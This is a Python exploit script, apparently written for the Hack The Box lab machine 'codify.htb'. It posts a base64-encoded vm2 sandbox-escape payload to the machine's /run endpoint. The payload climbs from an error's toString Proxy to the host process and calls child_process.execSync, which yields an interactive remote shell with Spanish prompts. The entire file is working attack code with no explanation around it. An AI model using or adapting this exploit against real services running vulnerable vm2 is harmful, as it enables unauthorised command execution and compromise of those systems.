```python
#!/bin/python3

import requests
import base64
import json

url = 'http://codify.htb:3000/run'
headers = {
    'Content-Type': 'application/json',
}

def send_request(command):
    raw_code = (
        'const { VM } = require("vm2");\n'
        'const vm = new VM();\n\n'
        'const code = `\n'
        '  const err = new Error();\n'
        '  err.name = {\n'
        '    toString: new Proxy(() => "", {\n'
        '      apply(target, thiz, args) {\n'
        f'        const process = args.constructor.constructor("return process")();\n'
        f'        throw process.mainModule.require("child_process").execSync("{command}").toString();\n'
        '      },\n'
        '    }),\n'
        '  };\n'
        '  try {\n'
        '    err.stack;\n'
        '  } catch (stdout) {\n'
        '    stdout;\n'
        '  }\n'
        '`;\n\n'
        'console.log(vm.run(code)); // RCE'
    )

    encoded_code = base64.b64encode(raw_code.encode()).decode()
    payload = json.dumps({"code": encoded_code})
    response = requests.post(url, headers=headers, data=payload)
    return response

print("Shell, introduce un comando")
while True:
    try:
        commandUser = input("$> ")
        if commandUser.lower() == "exit": 
            break
        else:
            response = send_request(commandUser)
            response_data = response.json()
            command_output = response_data.get('output', '').strip()  
            print(command_output)
    except KeyboardInterrupt:
        print("\033[91m[*] Saliendo...\033[0m")  
        break
```
